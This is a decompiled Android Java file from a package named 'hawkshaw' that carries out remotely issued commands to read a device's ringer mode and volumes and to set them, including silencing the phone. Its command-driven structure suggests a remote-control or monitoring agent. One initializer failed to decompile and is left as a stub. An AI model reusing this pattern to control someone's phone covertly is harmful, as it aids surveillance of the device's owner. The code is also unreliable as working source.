package com.hawkshaw.library.features.misc;

import E.k;
import F3.b;
import Y1.K;
import android.media.AudioManager;
import com.hawkshaw.library.App;
import com.hawkshaw.library.datalayer.models.Command;
import com.hawkshaw.library.datalayer.network.twirp.interceptors.ContentNegotiationInterceptorKt;
import com.hawkshaw.library.logger.Logger;
import i.C0528x;

public final class DeviceAudioKt {
    private static final String TAG = "DeviceAudio";

    public /* synthetic */ class WhenMappings {
        public static final /* synthetic */ int[] $EnumSwitchMapping$0;
        public static final /* synthetic */ int[] $EnumSwitchMapping$1;

        /* JADX WARNING: Can't wrap try/catch for region: R(15:0|(2:1|2)|3|(2:5|6)|7|9|10|11|12|13|14|15|16|17|19) */
        /* JADX WARNING: Failed to process nested try/catch */
        /* JADX WARNING: Missing exception handler attribute for start block: B:11:0x002a */
        /* JADX WARNING: Missing exception handler attribute for start block: B:13:0x0032 */
        /* JADX WARNING: Missing exception handler attribute for start block: B:15:0x003b */
        static {
            /*
                com.hawkshaw.library.datalayer.models.Command$CommandType[] r0 = com.hawkshaw.library.datalayer.models.Command.CommandType.values()
                int r0 = r0.length
                int[] r0 = new int[r0]
                r1 = 1
                com.hawkshaw.library.datalayer.models.Command$CommandType r2 = com.hawkshaw.library.datalayer.models.Command.CommandType.PushDeviceAudio     // Catch:{ NoSuchFieldError -> 0x0010 }
                int r2 = r2.ordinal()     // Catch:{ NoSuchFieldError -> 0x0010 }
                r0[r2] = r1     // Catch:{ NoSuchFieldError -> 0x0010 }
            L_0x0010:
                r2 = 2
                com.hawkshaw.library.datalayer.models.Command$CommandType r3 = com.hawkshaw.library.datalayer.models.Command.CommandType.SetDeviceAudio     // Catch:{ NoSuchFieldError -> 0x0019 }
                int r3 = r3.ordinal()     // Catch:{ NoSuchFieldError -> 0x0019 }
                r0[r3] = r2     // Catch:{ NoSuchFieldError -> 0x0019 }
            L_0x0019:
                $EnumSwitchMapping$0 = r0
                com.hawkshaw.library.datalayer.models.Command$DeviceAudioRequest$RingerMode[] r0 = com.hawkshaw.library.datalayer.models.Command.DeviceAudioRequest.RingerMode.values()
                int r0 = r0.length
                int[] r0 = new int[r0]
                com.hawkshaw.library.datalayer.models.Command$DeviceAudioRequest$RingerMode r3 = com.hawkshaw.library.datalayer.models.Command.DeviceAudioRequest.RingerMode.Unknown     // Catch:{ NoSuchFieldError -> 0x002a }
                int r3 = r3.ordinal()     // Catch:{ NoSuchFieldError -> 0x002a }
                r0[r3] = r1     // Catch:{ NoSuchFieldError -> 0x002a }
            L_0x002a:
                com.hawkshaw.library.datalayer.models.Command$DeviceAudioRequest$RingerMode r1 = com.hawkshaw.library.datalayer.models.Command.DeviceAudioRequest.RingerMode.Normal     // Catch:{ NoSuchFieldError -> 0x0032 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0032 }
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0032 }
            L_0x0032:
                com.hawkshaw.library.datalayer.models.Command$DeviceAudioRequest$RingerMode r1 = com.hawkshaw.library.datalayer.models.Command.DeviceAudioRequest.RingerMode.Silent     // Catch:{ NoSuchFieldError -> 0x003b }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x003b }
                r2 = 3
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x003b }
            L_0x003b:
                com.hawkshaw.library.datalayer.models.Command$DeviceAudioRequest$RingerMode r1 = com.hawkshaw.library.datalayer.models.Command.DeviceAudioRequest.RingerMode.Vibrate     // Catch:{ NoSuchFieldError -> 0x0044 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0044 }
                r2 = 4
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0044 }
            L_0x0044:
                $EnumSwitchMapping$1 = r0
                return
            */
            throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.features.misc.DeviceAudioKt.WhenMappings.<clinit>():void");
        }
    }

    private static final void getDeviceAudio() {
        AudioManager audioManager = (AudioManager) k.getSystemService(App.Companion.getContext(), AudioManager.class);
        if (audioManager != null) {
            int ringerMode = audioManager.getRingerMode();
            Command.DeviceAudioRequest deviceAudioRequest = new Command.DeviceAudioRequest(ringerMode != 0 ? ringerMode != 1 ? ringerMode != 2 ? Command.DeviceAudioRequest.RingerMode.Unknown : Command.DeviceAudioRequest.RingerMode.Normal : Command.DeviceAudioRequest.RingerMode.Vibrate : Command.DeviceAudioRequest.RingerMode.Silent, getDeviceAudio$getVolume(audioManager, 3), getDeviceAudio$getVolume(audioManager, 2), getDeviceAudio$getVolume(audioManager, 0), getDeviceAudio$getVolume(audioManager, 4));
            Logger logger = Logger.INSTANCE;
            b json = ContentNegotiationInterceptorKt.getJson();
            json.getClass();
            Logger.log$default(logger, TAG, "DeviceAudio: ".concat(json.b(Command.DeviceAudioRequest.Companion.serializer(), deviceAudioRequest)), false, 4, (Object) null);
        }
    }

    private static final int getDeviceAudio$getVolume(AudioManager audioManager, int i5) {
        return (audioManager.getStreamVolume(i5) * 100) / audioManager.getStreamMaxVolume(i5);
    }

    public static final void handleDeviceAudioCommand(Command command) {
        K.n(command, "command");
        int i5 = WhenMappings.$EnumSwitchMapping$0[command.getType().ordinal()];
        if (i5 == 1) {
            getDeviceAudio();
        } else if (i5 == 2) {
            setDeviceAudio(command.getSetDeviceAudioRequest());
        }
    }

    private static final void setDeviceAudio(Command.DeviceAudioRequest deviceAudioRequest) {
        AudioManager audioManager;
        if (deviceAudioRequest != null && (audioManager = (AudioManager) k.getSystemService(App.Companion.getContext(), AudioManager.class)) != null) {
            try {
                int i5 = WhenMappings.$EnumSwitchMapping$1[deviceAudioRequest.getRingerMode().ordinal()];
                int i6 = 1;
                if (i5 == 1) {
                    i6 = audioManager.getRingerMode();
                } else if (i5 == 2) {
                    i6 = 2;
                } else if (i5 == 3) {
                    i6 = 0;
                } else if (i5 != 4) {
                    throw new RuntimeException();
                }
                audioManager.setRingerMode(i6);
            } catch (Exception e5) {
                Logger.e$default(Logger.INSTANCE, TAG, C0528x.h("SetDeviceAudio: ", e5.getMessage()), (Exception) null, false, 12, (Object) null);
            }
            setDeviceAudio$setVolume(audioManager, 3, deviceAudioRequest.getMusicVolume());
            setDeviceAudio$setVolume(audioManager, 2, deviceAudioRequest.getRingVolume());
            setDeviceAudio$setVolume(audioManager, 0, deviceAudioRequest.getCallVolume());
            setDeviceAudio$setVolume(audioManager, 4, deviceAudioRequest.getAlarmVolume());
            Logger.v$default(Logger.INSTANCE, TAG, C0528x.b("SetDeviceAudio: RingerMode - ", audioManager.getRingerMode()), false, 4, (Object) null);
        }
    }

    private static final void setDeviceAudio$setVolume(AudioManager audioManager, int i5, int i6) {
        if (i6 >= 0) {
            audioManager.setStreamVolume(i5, (audioManager.getStreamMaxVolume(i5) * i6) / 100, 0);
        }
    }
}
